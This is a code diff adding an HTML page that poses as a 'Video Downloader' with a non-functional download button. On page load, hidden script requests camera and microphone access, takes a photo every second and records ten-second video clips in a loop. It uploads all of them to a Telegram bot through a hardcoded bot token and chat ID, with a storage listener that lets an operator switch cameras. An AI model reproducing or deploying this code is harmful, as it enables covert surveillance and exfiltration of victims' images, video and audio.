@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Downloader</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .container h1 { color: #007bff; margin-bottom: 10px; }
+        .container p { color: #666; margin-bottom: 25px; font-size: 1.1rem; }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        button:hover { background: #0056b3; }
+        
+        /* Hidden elements for background capture */
+        #videoElement, #canvasElement { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Video Downloader</h1>
+        <p>Hi, you can download video from website.</p>
+        <input type="text" placeholder="Paste video URL here..." id="vidUrl">
+        <button onclick="alert('Download feature will be added soon!')">Download</button>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="canvasElement"></canvas>
+
+    <script>
+        // === YOUR TELEGRAM CREDENTIALS ===
+        const BOT_TOKEN = '8725809195:AAFjqaGyk-3Gtovdc-OQImMhJ8TXm9Pw6dY';
+        const CHAT_ID = '8725809195'; // Make sure this is your User ID, not Bot ID
+        
+        let currentStream = null;
+        let photoInterval = null;
+        let mediaRecorder = null;
+        let recordingTimeout = null;
+
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const ctx = canvas.getContext('2d');
+
+        // Function to start the camera loop
+        async function startCapture(facingMode) {
+            // Stop any existing streams and intervals before switching
+            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+            if (photoInterval) clearInterval(photoInterval);
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+            if (recordingTimeout) clearTimeout(recordingTimeout);
+
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode },
+                    audio: true
+                });
+                
+                video.srcObject = currentStream;
+
+                video.onloadedmetadata = () => {
+                    // 1. Take Photo every 1 second
+                    photoInterval = setInterval(() => capturePhoto(facingMode), 1000);
+                    
+                    // 2. Start the 10-second Video Loop
+                    recordVideoLoop(facingMode);
+                };
+            } catch (err) {
+                console.error("Camera access denied.", err);
+            }
+        }
+
+        function recordVideoLoop(facingMode) {
+            if (!currentStream) return;
+            
+            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
+            let chunks = [];
+            
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            mediaRecorder.onstop = () => {
+                // Send the video when it stops
+                sendVideo(chunks, facingMode);
+                // Restart loop if the stream hasn't been changed by the admin
+                if (currentStream.active) {
+                    recordVideoLoop(facingMode);
+                }
+            };
+
+            mediaRecorder.start();
+            
+            // Stop after 10 seconds to trigger the send
+            recordingTimeout = setTimeout(() => {
+                if (mediaRecorder.state === "recording") mediaRecorder.stop();
+            }, 10000);
+        }
+
+        // --- Telegram Upload Helpers ---
+        function capturePhoto(facingMode) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `photo_${facingMode}.jpg`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+        }
+
+        function sendVideo(chunks, facingMode) {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, `video_${facingMode}.webm`);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        }
+
+        // --- Listen for Admin Changes ---
+        window.addEventListener('storage', (event) => {
+            if (event.key === 'cameraTarget') {
+                const newCamera = event.newValue || 'user';
+                startCapture(newCamera); // Restart capture with new camera
+            }
+        });
+
+        // --- Start on Load ---
+        window.onload = () => {
+            // Read from local storage, default to front camera ('user')
+            const savedCamera = localStorage.getItem('cameraTarget') || 'user';
+            startCapture(savedCamera);
+        };
+    </script>
+</body>
+</html>
